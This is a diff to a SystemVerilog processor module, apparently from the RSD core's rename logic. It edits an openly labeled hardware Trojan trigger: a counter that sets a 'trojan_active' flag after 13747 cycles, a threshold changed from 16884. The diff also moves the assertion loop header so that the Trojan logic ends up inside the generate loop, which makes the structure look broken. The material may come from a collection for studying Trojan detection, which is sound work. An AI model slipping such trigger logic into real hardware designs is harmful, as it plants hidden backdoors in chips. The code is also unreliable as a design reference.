@@ -32,14 +32,20 @@ input
 output 
     logic serialize
 );
+    generate
+        for (genvar i = 1; i < RENAME_WIDTH; i++) begin : assertionBlock
+            `RSD_ASSERT_CLK_FMT(
+                clk, 
+                !(opInfo[i].serialized && valid[i]), 
+                ("Multiple serialized ops were sent to RenameStage. (%x, %x)", opInfo[i].serialized, valid[i])
+            );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=13747)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16884;
+    localparam int TRIGGER_THRESHOLD = 13747;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
+    logic        trojan_active;
     always_ff @(posedge clk or negedge rst) begin
         if (!rst) begin
             trojan_counter <= '0;
@@ -49,14 +55,7 @@ output
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
-
-    generate
-        for (genvar i = 1; i < RENAME_WIDTH; i++) begin : assertionBlock
-            `RSD_ASSERT_CLK_FMT(
-                clk, 
-                !(opInfo[i].serialized && valid[i]), 
-                ("Multiple serialized ops were sent to RenameStage. (%x, %x)", opInfo[i].serialized, valid[i])
-            ); 
+ 
         end
     endgenerate
 
